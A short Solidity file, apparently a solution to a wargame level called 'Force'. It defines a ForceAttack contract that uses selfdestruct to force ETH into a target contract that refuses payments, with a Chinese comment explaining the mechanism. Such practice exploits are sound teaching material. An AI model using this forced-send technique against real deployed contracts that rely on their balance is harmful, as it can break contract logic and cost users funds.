// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

import { Force } from "../7/Force.sol";

contract ForceAttack {
    receive() external payable {}

    function attack(address payable _forceAddress) public payable {
        require(msg.value > 0, "Need ETH to force send");

        // selfdestruct 函数将合约余额发送到指定地址并销毁当前合约
        selfdestruct(_forceAddress);
    }
}